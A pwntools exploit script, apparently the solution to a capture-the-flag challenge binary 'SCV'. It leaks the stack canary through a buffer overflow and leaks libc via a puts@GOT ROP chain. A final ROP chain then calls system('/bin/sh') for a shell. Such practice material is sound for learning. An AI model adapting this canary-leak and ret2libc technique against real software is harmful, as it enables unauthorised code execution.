from pwn import *


elf = ELF('./SCV')
libc = elf.libc 


io = process('./SCV')

offset_to_libc = 8
offset_to_canary = 168

ret = 0x00000000004008b1
pop_rdi_ret = 0x0000000000400ea3
main = 0x00400a96
got_puts = elf.got.puts
puts = elf.sym.puts

def feed(payload):
    io.sendlineafter(b'>>',b'1')
    io.sendlineafter(b'>>',payload)


def review_the_food():
    io.sendlineafter(b'>>',b'2')
    io.recvuntil(b'[*]PLEASE TREAT HIM WELL.....\n')
    io.recvline()
    io.recvline()
    return io.recvline()
    
def mine():
    io.sendlineafter(b'>>',b'3')

def leak_canary():
    payload = b'A'*offset_to_canary
    feed(payload)
    leak = review_the_food()
    return leak.split(b"@\x0e@")[0].rjust(8,b'\x00')
    
def leak_libc():
    payload = b''
    payload += b'A'*offset_to_canary
    payload += p64(canary)
    payload += p64(0x4242424242424242)
    payload += p64(pop_rdi_ret)
    payload += p64(got_puts)
    payload += p64(puts)
    payload += p64(main)

    feed(payload)
    mine()
    io.recvline()
    return io.recvline().strip().ljust(8,b"\x00")
    

gs = '''
    continue
'''

if args.GDB:
    gdb.attach(io, gdbscript=gs)
    


canary = u64(leak_canary())
log.success(f'canary value @ 0x{canary:02x}')

libc.address = u64(leak_libc()) - libc.sym.puts 

log.success(f'libc base @ 0x{libc.address:02x}')

sh = next(libc.search(b'/bin/sh\x00'))

log.success(f'/bin/sh @ 0x{sh:02x}')


rop = b''
rop += p64(pop_rdi_ret)
rop += p64(sh)
rop += p64(ret)
rop += p64(libc.sym.system)
rop += p64(ret)

payload = b''
payload += b'A'*offset_to_canary
payload += p64(canary)
payload += p64(ret) # padding between canary and return value
payload += rop

feed(payload)
mine()

io.recvline()
io.interactive()
